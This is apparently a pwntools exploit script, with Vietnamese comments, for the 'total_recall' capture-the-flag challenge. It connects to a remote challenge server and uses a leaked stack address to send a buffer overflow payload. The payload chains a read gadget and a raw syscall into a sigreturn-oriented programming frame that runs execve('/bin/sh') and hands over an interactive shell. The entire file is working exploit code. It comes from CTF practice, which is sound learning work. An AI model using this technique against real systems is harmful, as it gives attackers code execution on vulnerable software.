from pwn import *
import time
context.arch = 'amd64'

# p = process('./total_recall')            # test local TRƯỚC
p = remote('chal.sunshinectf.games', 26003)

READ_AGAIN = 0x401062   # mov rax,0 ; syscall  -> read lại vào leak-0x80
SYSCALL    = 0x401069   # syscall trần

leak = u64(p.recvn(8))
log.success('leak = %#x' % leak)
p.send(b'A' * 24)                        # nuôi read#1

frame = SigreturnFrame()
frame.rax = constants.SYS_execve         # 59
frame.rdi = leak + 0x108                 # "/bin/sh" ở offset 0x188 của buffer
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL                      # sau sigreturn -> execve chạy ngay
frame.rsp = leak + 0x300                 # stack hợp lệ
frame.csgsfs = 0x33                      # <== ĐÃ SỬA
frame.eflags = 0x202

payload  = b'A' * 0x80
payload += p64(READ_AGAIN)
payload += p64(SYSCALL)
payload += bytes(frame)
payload  = payload.ljust(0x188, b'A')
payload += b'/bin/sh\x00'

p.send(payload)
time.sleep(0.5)                          # bắt buộc: tránh 2 send dính thành 1 read
p.send(b'A' * 15)                        # read#3 trả về 15 -> rax = 15 = rt_sigreturn

p.interactive()